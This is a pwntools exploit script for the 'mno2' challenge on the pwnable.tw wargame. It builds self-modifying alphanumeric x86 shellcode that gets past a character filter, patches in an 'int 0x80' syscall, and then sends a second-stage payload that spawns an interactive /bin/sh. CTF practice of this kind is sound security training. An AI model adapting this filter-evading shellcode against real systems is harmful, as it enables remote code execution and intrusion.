#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
A = lambda len=1, c=b'A': c * len
z = lambda len=1, c=b'\0': c * len

exe = ELF("mno2_patched", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
b *main+167
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.25)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10301
        return remote(host, port)

p = conn()

filtered = {
    "A": ["l", "r", "s", "g", "u", "t", "c", "m"],
    "B": ["e", "", "r", "a", "i", "k", "h"],
    "C": ["", "l", "a", "r", "o", "u", "d", "s", "m", "n", "f"],
    "D": ["y", "b", "s"],
    "E": ["u", "r", "s"],
    "F": ["", "e", "r", "l", "m"],
    "G": ["a", "e", "d"],
    "H": ["", "e", "f", "g", "o", "s"],
    "I": ["", "n", "r"],
    "K": ["", "r"],
    "L": ["i", "a", "u", "r", "v"],
    "M": ["g", "n", "o", "t", "d"],
    "N": ["", "e", "a", "i", "b", "d", "p", "o"],
    "O": ["", "s"],
    "P": ["", "d", "t", "r", "m", "b", "o", "a", "u"],
    "R": ["b", "h", "u", "e", "n", "a", "f", "g"],
    "S": ["i", "", "c", "e", "r", "n", "b", "m", "g"],
    "T": ["i", "c", "b", "m", "a", "l", "h"],
    "U": [""],
    "V": [""],
    "W": [""],
    "X": ["e"],
    "Y": ["", "b"],
    "Z": ["n", "r"],
}

'''
| Char | Hex       | Instruction                  
| ---- | --------- | -------------------------------------------
| 0–3  | 0x30–0x33 | xor r/m8,r8 / xor r/m32,r32 / xor r8,r/m8 / xor r32,r/m32
| 4    | 0x34      | xor al, imm8                 
| 5    | 0x35      | xor eax, imm32               
| 8–9  | 0x38–0x39 | cmp r/m8,r8 / cmp r/m32,r32  
| A    | 0x41      | inc ecx                      
| B    | 0x42      | inc edx                      
| C    | 0x43      | inc ebx                      
| D    | 0x44      | inc esp                      
| E    | 0x45      | inc ebp                      
| F    | 0x46      | inc esi                      
| G    | 0x47      | inc edi                      
| H    | 0x48      | dec eax                      
| I    | 0x49      | dec ecx                      
| K    | 0x4B      | dec ebx                      
| L    | 0x4C      | dec esp                      
| M    | 0x4D      | dec ebp                      
| N    | 0x4E      | dec esi                      
| O    | 0x4F      | dec edi                      
| P    | 0x50      | push eax                     
| R    | 0x52      | push edx                     
| S    | 0x53      | push ebx                     
| T    | 0x54      | push esp                     
| U    | 0x55      | push ebp                     
| V    | 0x56      | push esi                     
| W    | 0x57      | push edi                     
| X    | 0x58      | pop eax                      
| Y    | 0x59      | pop ecx                      
| Z    | 0x5A      | pop edx                      
| a    | 0x61      | popad                        
| b    | 0x62      | bound (2-byte, ModRM follows)
| c    | 0x63      | arpl                         
| d    | 0x64      | FS segment override prefix   
| e    | 0x65      | GS segment override prefix   
| f    | 0x66      | 16-bit operand size prefix   
| g    | 0x67      | 16-bit address size prefix   
| h    | 0x68      | push imm32                   
| i    | 0x69      | imul reg, r/m, imm32         
| k    | 0x6B      | imul reg, r/m, imm8          
'''

shellcode = b""
# sub ecx, 11 -> cl = 0xf5
shellcode += b"I" * 11
# xor dword ptr [eax + 0x65], ecx
shellcode += b"1He" # 0x38 ^ 0xf5 = 0xcd
# push 0x46464646; pop ecx -> cl = 0x46
shellcode += b"BhFFFFY"
# xor dword ptr [eax + 0x66], ecx
shellcode += b'1Hf' # 0x39 ^ 0x46 ^ 0xff = 0x80
# eax = 0x324f6e4d
# push eax (x3)
shellcode += b'PPP'
# push 0x33333333
shellcode += b"Bh3333"
# pop eax; xor eax, 0x33333333 -> eax = 0
shellcode += b'Xe53333'
# push eax (x5); popad
shellcode += b'PPPPPa'
'''
EDI -> 0
ESI -> 0
EBP -> 0
ESP (discarded)
EBX -> 0
EDX -> 0x324f6e4d
ECX -> 0x324f6e4d
EAX -> 0x324f6e4d
'''
# push 0x33333334
shellcode += b"Bh4333"
# pop eax; xor eax, 0x33333337 -> eax = 3
shellcode += b'Xe57333'
# just padding
shellcode = shellcode.ljust(101, b'F')
# [eax + 0x65] = 0x38
# [eax + 0x66] = 0x39
# -> int 0x80
shellcode += b'89'

sl(p, shellcode)

sleep(1)

s(p, b'\x90' * 0x67 + asm(shellcraft.sh()))
ia(p)